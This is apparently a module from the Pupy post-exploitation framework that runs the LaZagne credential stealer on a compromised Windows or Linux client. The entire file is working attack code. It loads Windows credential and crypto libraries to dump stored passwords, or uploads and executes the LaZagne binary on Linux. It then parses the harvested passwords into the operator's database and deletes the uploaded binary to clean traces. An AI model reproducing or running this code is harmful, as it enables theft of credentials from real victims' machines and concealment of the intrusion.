# -*- coding: UTF8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
import tempfile
import subprocess
import os.path
from pupylib.utils.rpyc_utils import redirected_stdo

__class_name__="LaZagne"

@config(cat="creds")
class LaZagne(PupyModule):
    """ 
        execute LaZagne (Windows / Linux)
    """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="lazagne", description=self.__doc__)
        self.arg_parser.add_argument("-v", "--verbose", action='store_true')

    def run(self, args):
        platform=self.client.desc["platform"]
        if "Windows" in platform:
            if "64" in self.client.desc["proc_arch"]:
                self.error('Not yet implemented for a x64 bits process, migrate to a 32 bits process and try again ! \nEx: run migrate -c \'C:\\Windows\\SysWOW64\\notepad.exe\'')
                return

            # load all dependency
            self.client.load_dll(os.path.abspath(os.path.join(os.path.dirname(__file__),"..", "packages", "windows", "x86", "sqlite3.dll")))
            self.client.load_package("sqlite3")
            self.client.load_package("_sqlite3")
            self.client.load_package("xml")
            self.client.load_package("_elementtree")
            self.client.load_package("pyexpat")         # needed for _elementtree module
            self.client.load_package("win32crypt")
            self.client.load_package("win32api")
            self.client.load_package("win32con")
            self.client.load_package("win32cred")
            self.client.load_package("colorama")
            self.client.load_package("impacket")
            self.client.load_package("calendar")
            self.client.load_package("win32security")
            self.client.load_package("win32net")
            self.client.load_package("lazagne")

            db = Credentials()

            moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
            for module in moduleNames:
                if args.verbose:
                    self.info("running module %s"%(str(module).split(' ',1)[0].strip('<')))
                passwords = module.run(module.options['dest'].capitalize())
                self.print_results(module.options['dest'].capitalize(), passwords, db)
            
        elif "Linux" in platform:
            isWindows = False
            if "64" in self.client.desc["os_arch"]:
                lazagne_path = self.client.pupsrv.config.get("lazagne","linux_64")
            else:
                lazagne_path = self.client.pupsrv.config.get("lazagne","linux_32")
        
            if not os.path.isfile(lazagne_path):
                self.error("laZagne exe %s not found ! please edit laZagne section in pupy.conf"%lazagne_path)
                self.error('Find releases on github: https://github.com/AlessandroZ/LaZagne/releases')
                return
            
            tf = tempfile.NamedTemporaryFile()
            dst = tf.name
            tf.file.close()

            self.success("Uploading laZagne to: %s" % dst)
            upload(self.client.conn, lazagne_path, dst)
            
            self.success("Adding execution permission")
            cmd = ["chmod", "+x", dst]
            output = self.client.conn.modules.subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

            self.success("Executing")
            cmd = [dst, "all"]
            output = self.client.conn.modules.subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
            self.success("%s" % output)
            
            creds = self.parse_output(output)
            db = Credentials()
            db.add(creds)
            self.success("Passwords stored on the database")
            
            self.success("Cleaning traces")
            self.client.conn.modules['os'].remove(dst)

        else:
            self.error("Platform not supported")
            return

    def print_results(self, module, creds, db):
        if creds:
            print "\n############## %s passwords ##############\n" % module
            clean_creds = []
            for cred in creds:
                clean_cred = {}
                clean_cred['Tool'] = 'Lazagne'
                clean_cred['uid']=self.client.short_name()
                for c in cred.keys():
                    clean_cred[c] = cred[c].encode('utf-8')
                    print "%s: %s" % (c, cred[c])
                print
                clean_creds.append(clean_cred)

            try:
                db.add(clean_creds)
                self.success("Passwords stored on the database")
            except Exception, e:
                print e

    def parse_output(self, output):
        creds = []
        toSave = False
        ishashes = False
        cpt = 0
        user = ""
        category = ""
        for line in output.split('\n'):
            if not toSave:
                if "##########" in line:
                    user='%s' % line.replace('##########', '').split(':')[1].strip()

                if "---------" in line:
                    category='%s' % line.replace('-', '').strip()

                if " found !!!" in line and "not found !!!" not in line:
                    toSave = True
                    cred = {}
            else:
                if not line or line == '\r':
                    if ishashes:
                        cpt+=1
                    if cpt > 1 or not ishashes:
                        toSave = False
                        ishashes = False
                        if cred:
                            cred['Tool']="LaZagne"
                            cred['uid']=self.client.short_name()
                            if user:
                                cred['System user'] = user
                            if category:
                                cred['Category'] = category
                            creds.append(cred)
                else:
                    # not store hashes => creddump already does it
                    if not ishashes:
                        if "hashes: " in line:
                            ishashes = True
                            cpt = 0
                        else:
                            try:
                                key, value = line.split(':', 1)
                                cred[key] = value.strip()
                            except:
                                pass
        return creds
